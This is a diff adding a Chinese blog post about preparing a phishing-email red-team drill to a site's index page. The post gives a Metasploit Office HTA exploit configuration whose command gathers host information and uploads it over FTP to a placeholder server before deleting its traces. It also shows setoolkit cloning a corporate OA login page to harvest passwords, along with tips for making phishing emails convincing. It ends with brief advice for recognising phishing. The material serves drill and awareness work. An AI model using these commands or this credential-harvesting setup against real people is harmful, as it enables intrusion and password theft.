@@ -259,6 +259,171 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/16/记一次钓鱼邮件攻防演练环境准备（2）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="L.Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/L.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's tale">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/16/记一次钓鱼邮件攻防演练环境准备（2）/" itemprop="url">记一次钓鱼邮件攻防演练环境准备（2）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-16T20:05:06+08:00">
+                2018-07-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>&#160; &#160; &#160; &#160;上一篇文中，解决了前半部分的发送问题，这篇主要想讨论一下钓鱼的一些思路及实现方式。目前常见的钓鱼方式有如下几种：</p>
+<ul>
+<li>发送恶意附件，客户运行后在客户端植入木马病毒  </li>
+<li>发送钓鱼网站链接，来获取用户账户密码  </li>
+<li>发送存有恶意代码的网站链接，利用浏览器漏洞在客户端植入木马病毒  </li>
+<li>…  </li>
+</ul>
+<h3 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h3><p>&#160; &#160; &#160; &#160;通过发送恶意附件，利用各种程序漏洞，在目标机器执行代码是钓鱼的常用技巧，现在有些漏洞的利用难度越来越低，也让钓鱼成功率大大增加，此案例1就以利用office漏洞为例，在目标执行office文件后，执行命令收集目标机器的账户名和IP地址，这里是通过自建一个自动上传至ftp的bat文件把主机信息收集起来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#使用office漏洞作为附件收集机器信息</span><br><span class="line">use exploit/windows/fileformat/office_word_hta</span><br><span class="line"></span><br><span class="line">#使用exec执行命令收集</span><br><span class="line">set PAYLOAD windows/exec</span><br><span class="line"></span><br><span class="line">#设置执行语句，在本地获取信息后发送到ftp服务器</span><br><span class="line">set CMD cmd.exe /c whoami &gt;&gt; info.txt &amp;&amp; ipconfig &gt;&gt; info.txt &amp;&amp; echo @echo off &gt;&gt; info.bat &amp; echo ftp -n -s:ftp.cfg &gt;&gt; info.bat &amp; echo open xxx.xxx.xxx.xxx &gt;&gt; ftp.cfg &amp; echo user test 123 &gt;&gt; ftp.cfg &amp; echo prompt off &gt;&gt; ftp.cfg &amp; echo bin &gt;&gt; ftp.cfg &amp; echo put info.txt &gt;&gt; ftp.cfg %random%%random%.txt &amp; echo bye &gt;&gt; ftp.cfg &amp;&amp; info.bat &amp;&amp; del ftp.cfg &amp;&amp; del info.txt &amp;&amp; del info.bat &amp;&amp; exit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/rosetscmite/tu/master/6/6-1.png" alt="image">  </p>
+<p><img src="https://raw.githubusercontent.com/rosetscmite/tu/master/6/6-2.png" alt="image">  </p>
+<p><img src="https://raw.githubusercontent.com/rosetscmite/tu/master/6/6-3.png" alt="image">  </p>
+<h3 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h3><p>&#160; &#160; &#160; &#160;通过邮件模拟企业内发生的事件，引诱用户点击钓鱼链接，来获取目标账户密码信息，加强此方案的成功率需要注意以下几点：</p>
+<ul>
+<li>发件人地址与邮件内容相关责任人相似</li>
+<li>邮件格式风格，logo等与企业相似</li>
+<li>钓鱼站点与真实站点相似，这里可以结合站点克隆工具或直接下载站点前端源码</li>
+<li>钓鱼站点域名与真实站点相似</li>
+<li>尽量选在中午12点-下午2点之间，此时间段非集中工作时间段，钓鱼的成功率较大  </li>
+</ul>
+<p>&#160; &#160; &#160; &#160;这里使用setoolkit克隆目标站点，来获取上钩目标的用户密码信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#运行setoolkit，依次选择1&gt;2&gt;3&gt;2</span><br><span class="line">#设置监听端口（实际情况下需要公网地址）</span><br><span class="line">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.218.128]:</span><br><span class="line">[-] SET supports both HTTP and HTTPS</span><br><span class="line">[-] Example: http://www.thisisafakesite.com</span><br><span class="line">#设置克隆目标站点</span><br><span class="line">set:webattack&gt; Enter the url to clone:https://oa.xxx.com/defaultroot/</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/rosetscmite/tu/master/6/6-4.png" alt="image">  </p>
+<p><img src="https://raw.githubusercontent.com/rosetscmite/tu/master/6/6-5.png" alt="image">  </p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>&#160; &#160; &#160; &#160;钓鱼邮件主要还是多以<strong>上级发送给下级索要敏感信息、爆发紧急事件等</strong>类型来降低目标警惕性，用户在查看邮件时要注意发件人是否为假冒的相似域名，称谓是否反常，URL链接不要轻易点开等。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/08/记一次钓鱼邮件攻防演练环境准备（1）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1241,7 +1406,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1263,7 +1428,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
